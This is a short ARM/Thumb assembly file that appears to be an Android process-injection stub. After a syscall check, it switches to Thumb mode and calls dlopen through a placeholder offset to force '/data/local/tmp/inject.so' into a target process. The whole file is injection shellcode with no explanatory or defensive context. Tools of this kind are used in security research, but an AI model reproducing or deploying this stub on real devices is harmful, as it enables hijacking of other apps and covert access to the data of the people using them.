.section .text
.global _start
_start:
    .code 32 
    mov    r12, r7
    mov    r7,  #0xC7
    svc    0
    mov    r7, r12
    cmp    r0, #0
    beq    payload
    cmn    r0, #0x1000
    bxls   lr

 payload:      
    push   {r0-r7, lr}

//-----------------------payload----------------------------------
    #Thumb-Mode on             //
	add r3, pc, #1    // This whole section is for "Thumb Mode"
    bx      r3            //
    .code 16              //

    mov     r0, pc
    add     r0, #16
    mov     r1, #0
    sub     r3, r3, r3
    add     r3, r3, pc
    add     r3, #34
    ldr     r3, [r3]
    add     r3, pc, r3
    blx      r3
    pop     {r0-r7, pc}

.ascii "/data/local/tmp/inject.so\x0"
.ascii "\x0\x0\x0\x0"//------------------dlopen offset-------------
